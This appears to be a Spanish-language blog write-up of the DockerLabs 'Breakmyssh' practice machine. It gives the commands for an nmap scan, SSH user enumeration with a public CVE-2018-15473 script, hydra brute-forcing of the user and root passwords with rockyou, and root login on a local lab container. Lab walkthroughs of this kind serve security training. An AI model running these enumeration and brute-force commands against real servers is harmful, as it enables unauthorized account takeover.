---
layout: post
title: "Breakmyssh"
date: 2024-07-15 11:05:23
category: dockerlabs
vm: dockerlabs
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Breakmyssh </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Muy Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/dockerlabs/breakmyssh/host.png){:.margin}

**1\.** Escaneando los puertos de la maquina objetivo, solo esta disponible el ssh.

`sudo nmap -open- --open -T5 --min-rate=5000 -sCV -sS -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/breakmyssh/nmap.png){:.margin}

**2\.** Ya que no tenemos nada mas, buscando como enumerar usuarios de ssh, encuentro un [CVE-2018-15473](https://github.com/Sait-Nuri/CVE-2018-15473).

`git clone -q https://github.com/Sait-Nuri/CVE-2018-15473`

`cd CVE-2018-15473`

`python3 CVE-2018-15473.py 172.17.0.2 -w /usr/share/wordlists/rockyou.txt | grep -v "invalid"`

![img](/notas/public/img/dockerlabs/breakmyssh/cvepy.png){:.margin}

**3\.** Teniendo el usuario ahora bruteforceo la contraseña con hydra.

`hydra -l lovely -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`

![img](/notas/public/img/dockerlabs/breakmyssh/hydra.png){:.margin}

**4\.** Me conecto por ssh con las credenciales obtenidas.

`ssh lovely@172.17.0.2`

![img](/notas/public/img/dockerlabs/breakmyssh/sshlovely.png){:.margin}

**5\.** No encontre nada para poder escalar, viendo el passwd solo tengo el usuario root.

`cat /etc/passwd | grep sh$`

![img](/notas/public/img/dockerlabs/breakmyssh/catpasswd.png){:.margin}

**6\.** Fuerza bruta a la contraseña de root con hydra.

`hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`

![img](/notas/public/img/dockerlabs/breakmyssh/hydraroot.png){:.margin}

**7\.** Solo nos queda conectarnos por ssh como root.

`ssh root@172.17.0.2`

![img](/notas/public/img/dockerlabs/breakmyssh/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>